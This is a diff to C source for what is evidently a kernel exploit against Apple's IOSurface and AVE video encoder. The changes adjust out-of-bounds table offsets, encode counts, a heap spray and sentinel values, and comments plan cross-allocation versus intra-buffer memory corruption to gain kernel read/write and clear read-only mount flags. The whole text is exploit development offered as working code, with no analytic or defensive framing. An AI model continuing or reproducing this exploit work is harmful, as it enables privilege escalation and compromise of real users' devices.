@@ -55,9 +55,15 @@ extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef v
 #define SPRAY_COUNT      64
 #define SPRAY_KEY        CFSTR("krw_spray")
 #define SENTINEL_MAGIC   0xDEADCAFE41414141ULL
-#define TABLE2_OOB_START 466     /* entry where table 2 crosses buffer boundary */
-#define ENCODES_FOR_OOB  155     /* ~155 encodes to reach table 2 OOB */
+#define TABLE2_OOB_START 256     /* entry 256 = first OOB from table 2 at +0x8DF4 */
+#define TABLE2_PAST_BUF  466     /* entry where table 2 passes buffer end +0x9B10 */
+#define TABLE2_CROSS_BUF 1057    /* entry where table 2 crosses allocation +0xC000 */
+#define ENCODES_FOR_OOB  155     /* ~155 encodes = 465 entries, intra-buffer OOB */
 #define SAFE_ENCODE_MAX  197     /* max before table 1 hits +0x5C70 crash site */
+/* NOTE: At 197 encodes, Table 2 reaches +0xA2E4, still 0x1D1C from +0xC000.
+ * Cross-allocation spray REQUIRES 352+ encodes = PAST CRASH BOUNDARY.
+ * IOSurface spray approach works ONLY IF crash_test proves entries 592+ reachable.
+ * Alternative: intra-buffer field corruption at +0x8DF4-0x9B10 (53 MOVZ fields). */
 
 /* MNT_RDONLY etc — mount flags we need to clear */
 #define MNT_RDONLY       0x00000001
@@ -811,8 +817,12 @@ int krw_init(krw_state_t *state) {
     }
     state->ave_session = (void *)session;
 
-    /* Phase 1c: Run encodes to trigger table 2 OOB into adjacent allocation */
-    printf("[init] Running %d encodes (table 2 OOB starts at ~%d)...\n",
+    /* Phase 1c: Run encodes for table 2 intra-buffer OOB.
+     * At ENCODES_FOR_OOB+20 = 175 encodes, table 2 reaches +0x9EC4 (past buffer,
+     * within allocation padding). Cross-allocation needs 352+ encodes but that's
+     * past the Table 1 crash boundary at ~198 encodes.
+     * First we try intra-buffer corruption; cross-allocation needs crash_test pass. */
+    printf("[init] Running %d encodes (table 2 OOB starts at ~86, intra-buf at ~%d)...\n",
            ENCODES_FOR_OOB + 20, ENCODES_FOR_OOB);
 
     int completed = run_encodes(session, ENCODES_FOR_OOB + 20, 128, 128);
